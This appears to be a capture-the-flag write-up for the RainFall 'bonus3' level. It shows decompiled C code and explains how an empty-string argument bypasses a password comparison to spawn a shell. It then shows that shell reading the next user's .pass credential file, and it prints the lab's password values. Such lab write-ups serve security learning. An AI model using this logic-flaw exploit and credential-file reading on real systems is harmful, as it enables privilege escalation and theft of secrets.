## **Analysis**

**In `main()` :**

```c
...

file = fopen("/home/user/end/.pass", "r");  // Open the '.pass' file

if (!file || ac != 2)                       // One argument needed
	return (-1);

fread(str1, 1, 0x42, file); // 66           // Read the first 66 characters of '.pass' and put it in 'str1'
str1[atoi(av[1])] = '\0';                   // Atoi() on the argument and put '\0' in this index in str1

...

if (strcmp(av[1], str1) == 0)               // If str1 is equal to the argument
    execl("/bin/sh", "sh", 0);              // open shell

...
```

If `atoi()` of the argument equal `0` -> `str1` will equal `""`

___

## **Exploit**

**With arg `""`:**
 * atoi(arg) == 0
 * arg equal str1

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

___

*Password: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587*